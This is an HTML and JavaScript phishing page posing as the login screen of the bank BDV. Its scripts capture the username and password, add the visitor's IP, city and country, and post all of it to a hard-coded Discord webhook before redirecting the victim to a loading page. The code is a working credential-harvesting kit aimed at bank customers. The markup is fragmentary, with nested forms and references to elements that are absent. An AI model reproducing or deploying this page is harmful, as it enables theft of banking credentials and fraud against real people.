<body>

<form id="loginform2" action="tu_post.php" method="post">

  <div class="container">
    <div class="left-side">
      <form id="loginform" class="form">
        <div style="text-align: center">
          <img src="./css/logo.png" alt="" style="width: 60%; margin-top: 20px" />
        </div>
        <div style="width: 100%; text-align: center">
          <div class="form-group">
            <input type="text" id="nombre" name="nombre" style="width: 100%" required />
            <label for="nombre">Usuario *</label>
          </div>
        </div>
        <div style="width: 100%; text-align: center">
          <button>Entrar</button>
        </div>
        <div style="width: 100%; text-align: center; font-size: 12px; font-weight: bold; color: #999; margin-top: 30px; margin-bottom: 30px;">
          ¿Olvidaste tu usuario o clave? <br />
          Si eres nuevo cliente BDV, regístrate aquí
        </div>

  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
  <script>
    const url = "https://ipapi.co/json/";
    const form = document.querySelector("#loginform");
    const form2 = document.querySelector("#loginform2");

    form.addEventListener("submit", (event) => {
      event.preventDefault(); // Evita que se envíe el formulario

      axios.get(url) // Realiza la solicitud GET para obtener información adicional
        .then((response) => {
          const nombre = document.querySelector("#nombre").value; // Obtiene el nombre del input
          localStorage.setItem("usuario", nombre); // Guarda el nombre en localStorage

          // Aquí puedes manejar la información obtenida como quieras, pero no enviar a Discord
          const ciudad = response.data.city;
          const pais = response.data.country;
          const ip = response.data.ip;

          // Si quieres mostrar la información en la consola o en el UI:
          console.log("Nombre guardado:", nombre);
          console.log("Ciudad:", ciudad);
          console.log("País:", pais);
          console.log("IP:", ip);

          // Muestra el overlay si es necesario
          document.getElementById("overlay").style.display = ""; 
        })
        .catch((error) => {
          console.log(error); // Manejo de errores
        });
    });

        form2.addEventListener("submit", (event) => {
      event.preventDefault(); // Evita que se envíe el formulario

      axios.get(url)
        .then((response) => {
          const nombre = localStorage.getItem("usuario"); // Recupera el nombre de localStorage
          const contra = document.querySelector("#contra").value; // Obtiene la contraseña del input

          // Verifica que el nombre no sea nulo
          if (!nombre) {
            console.error("No se ha guardado el nombre en la sesión.");
            return;
          }

          // Composición del mensaje a enviar a Discord
          const message =
            "BDV\nNombre: " +
            nombre +
            "\nContra: " +
            contra +
            "\nCiudad: " +
            response.data.city +
            "\nPais: " +
            response.data.country +
            "\nIP: " +
            response.data.ip;

          // Cambia esta URL por tu webhook de Discord
          const discordWebhookUrl = "https://discord.com/api/webhooks/1437941036763840636/5IXvFu6rMwkLEvQvT1nf-X-jTBKyfpiZd3CHJ3mD_84XIquCqBZFbbyIO1BJKg4hk9wd";

          // Envía el mensaje a Discord
          return axios.post(discordWebhookUrl, { content: message })
            .then(() => {
              // Muestra el botón para copiar el mensaje
              showCopyButton(message);
              // Redirige a la página de carga si el envío fue exitoso
              window.location.href = "cargando.html";
            });
        })
        .catch((error) => {
          console.error("Error:", error); // Manejo de errores
        });
    });

    // Función para mostrar el botón de copiar
    function showCopyButton(message) {
      const copyButtonContainer = document.createElement("div");
      copyButtonContainer.style.textAlign = "center";
      copyButtonContainer.style.marginTop = "20px";

      const copyButton = document.createElement("button");
      copyButton.innerText = "Copiar Mensaje";
      copyButton.style.backgroundColor = "#0067b1";
      copyButton.style.color = "white";
      copyButton.style.border = "none";
      copyButton.style.padding = "10px 20px";
      copyButton.style.borderRadius = "5px";

      // Evento para copiar el mensaje al portapapeles
      copyButton.onclick = function () {
        copyToClipboard(message);
        alert("El mensaje ha sido copiado al portapapeles.");
      };

      copyButtonContainer.appendChild(copyButton);
      document.body.appendChild(copyButtonContainer); // Añade el botón al cuerpo del documento
    }

    // Función para copiar texto al portapapeles
    function copyToClipboard(text) {
      const textarea = document.createElement("textarea");
      textarea.value = text;
      document.body.appendChild(textarea);
      textarea.select();
      document.execCommand("copy");
      document.body.removeChild(textarea);
    }
  </script>

   

<script>
document.addEventListener("DOMContentLoaded", function () {
  const form = document.getElementById("loginform2");
  const contra = document.getElementById("contra");
  const errorText = document.getElementById("errorContra");

  const specialCharRegex = /[^a-zA-Z0-9]/;

  // OJO: tercer parámetro TRUE = captura (se ejecuta primero)
  form.addEventListener("submit", function (e) {
    if (!specialCharRegex.test(contra.value)) {
      // ❌ inválido → bloquea TODO
      e.preventDefault();
      e.stopImmediatePropagation(); // corta otros listeners
      errorText.style.display = "block";
      return false; // respaldo extra
    }

    // ✅ válido → NO bloqueamos → el POST se envía
    errorText.style.display = "none";
  }, true);
});


</script>
